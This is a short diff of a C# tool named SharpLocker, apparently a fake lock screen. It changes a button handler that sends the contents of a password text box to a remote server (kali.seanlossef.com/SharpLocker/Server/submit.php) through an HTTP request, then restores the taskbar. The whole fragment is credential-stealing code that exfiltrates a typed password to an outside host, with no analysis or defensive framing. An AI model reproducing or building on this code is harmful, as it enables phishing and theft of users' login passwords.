@@ -202,7 +202,7 @@ namespace SharpLocker
 
         private void button1_Click_1(object sender, EventArgs e)
         {
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://kali.seanlossef.com/SharpLocker/Server/submit.php?" + PasswordTextBox.Text);
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://kali.seanlossef.com/SharpLocker/Server/submit.php?p=" + PasswordTextBox.Text);
             req.GetResponse();
 
             Taskbar.Show();
